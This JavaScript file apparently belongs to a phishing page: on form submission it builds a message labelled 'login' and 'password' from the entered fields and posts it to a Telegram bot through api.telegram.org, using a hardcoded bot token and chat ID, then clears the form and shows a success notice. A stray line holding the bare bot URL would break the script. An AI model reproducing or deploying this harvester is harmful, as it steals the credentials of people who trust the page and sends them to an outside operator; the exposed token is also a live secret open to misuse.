const TOKEN = "6151522644:AAHIPMrD6SKIpA3DJFGT43dHE8CPm0xM-Ds"
const CHAT_ID = "5588205938"
const UPI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage `
const success =  document.getElementById("success")
https://api.telegram.org/bot6151522644:AAHIPMrD6SKIpA3DJFGT43dHE8CPm0xM-Ds

document.getElementById("tg").addEventListener("submit", function (e) {
    e.preventDefault()
    console.log(this.radio.value)
    let message = `Заявка на сайт\n`;
    message += `login:  ${this.name.value}\n`;
    message += `password: ${this.tel.value}`;

    axios.post(UPI_API, {
        chat_id: CHAT_ID,
        parse_mode: 'html',
        text: message
    })
        .then((res) => {
            this.name.value = "";
            this.tel.value = "";
            // success.innerHTML = "отправельно!";
            success.style.display = "block";
        })
        .catch((err) => {
            console.warn(err)
        })
        .finally(() => {
            console.log("Успешно")
        })
})



// document.getElementById("tg").addEventListener("submit", function (e) {
//     e.preventDefault()
//     const checkBoxes = document.querySelectorAll("input[name=radio]:checked")
//
//     let values = []
//
//     checkBoxes.forEach(checkbox => {
//         values.push(checkbox.value)
//     })
//
//
//     let message  = ""
//
//     for(let i = 0; i < values.length; i++){
//         message += `${i+1} ${values[i]} \n`
//     }
//     axios.post(UPI_API, {
//         chat_id: CHAT_ID,
//         perse_mode: 'html',
//         text: message,
//         text2: name
//     })
//         .then((res) => {
//
//         })
//         .catch((err) => {
//             console.warn(err)
//         })
//         .finally(() => {
//             console.log("Успешно")
//         })
// })
